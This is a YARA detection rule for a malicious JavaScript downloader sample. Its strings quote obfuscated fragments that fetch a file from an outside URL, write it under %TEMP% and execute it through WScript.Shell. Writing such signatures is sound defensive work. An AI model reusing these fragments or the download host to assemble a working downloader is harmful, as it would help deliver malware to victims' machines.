rule sig_20160427_7e33f587b3a8fde77efd5664e3485852 {
  meta:
    description = "datamaliciousorder - file 20160427_7e33f587b3a8fde77efd5664e3485852.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d519f1fb862bbbbf2724420c7bf1a5bde6ef0abf304383c14fb50253c8c40ef1"

  strings:
    $s1  = "FvazcNkcij[TtwhtEsvgy](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function KudakZwbjk() {return PtzzmCogyv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8pXMCdT" ascii
    $s3  = "function KudakZwbjk() {return PtzzmCogyv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8pXMCdT" ascii
    $s4  = "var PtzzmCogyv = function PsuugQcigt() {return TepdnBrtjg[NtylxEszod](\"WScript\"+\".Shell\");}(), DhrzaXlhpb = 11;" fullword ascii
    $s5  = "function EalruFqqwz(AgtzzCgfku, DvkhtVhomy){KbwmeQqrah = KbwmeQqrah * 1; return AgtzzCgfku - DvkhtVhomy;};" fullword ascii
    $s6  = "var TepdnBrtjg = this[\"WScript\"];" fullword ascii
    $s7  = "function CnobyOfdom(){return ZipsvDvfzt + \"\";};" fullword ascii
    $s8  = "if (FvazcNkcij[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function JdyaqElwig() {return ((OheysDbioe == true) && (OheysDbioe == RjlppMchhs)) ? 1 : KbwmeQqrah;};" fullword ascii
    $s10 = "function WwjucVoixp(){return NtylxEszod;};" fullword ascii
    $s11 = "return EalruFqqwz(XuqpvXmnge, IafwlQnpmz);" fullword ascii
    $s12 = "function YikayYfgfr()" fullword ascii
    $s13 = "OheysDbioe = true; " fullword ascii
    $s14 = "function KbqawIkshm(){return 23;};" fullword ascii
    $s15 = "function ZtwsiYxsbs(NeswsThmpu) {var DcwynBacny = (1, 2, 3, 4, 5, NeswsThmpu); return DcwynBacny;};" fullword ascii
    $s16 = "var OheysDbioe = false;" fullword ascii
    $s17 = "function KtvhbBukkj(LlmnnRdnlj){PtzzmCogyv[\"R\"+\"un\"](LlmnnRdnlj, KbwmeQqrah, KbwmeQqrah);};" fullword ascii
    $s18 = "var RjlppMchhs = false;" fullword ascii
    $s19 = "}while (DbqdqApkkf);" fullword ascii
    $s20 = "var RegboNfmtp = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}